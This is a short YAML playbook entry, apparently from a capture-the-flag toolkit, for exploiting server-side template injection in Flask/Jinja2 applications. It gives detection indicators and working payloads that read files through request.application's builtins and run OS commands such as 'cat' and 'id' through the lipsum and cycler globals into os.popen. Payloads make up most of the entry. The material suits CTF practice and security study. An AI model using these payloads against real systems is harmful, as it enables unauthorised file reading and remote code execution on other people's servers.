name: ssti_jinja2
category: web
tags: [ssti, jinja2, template_injection, rce]
indicators:
  - "render_template_string with user input"
  - "User input directly in f-string template"
  - "{{7*7}} returns 49"
  - "Flask/Jinja2 application"

tricks:
  - name: "SSTI read file via builtins"
    when: "Jinja2 SSTI with no filter"
    how: "Access builtins.open through request.application"
    payload: |
      # Test SSTI:
      {{7*7}}  # Returns 49

      # Read file:
      {{request.application.__globals__.__builtins__.open('/tmp/flag').read()}}

  - name: "Alternative SSTI payloads"
    when: "Different Python/Jinja2 versions"
    how: "Use MRO chain to find subprocess"
    payload: |
      # Access config:
      {{config}}

      # Via lipsum:
      {{lipsum.__globals__['os'].popen('cat /tmp/flag').read()}}

      # Via cycler:
      {{cycler.__init__.__globals__.os.popen('id').read()}}
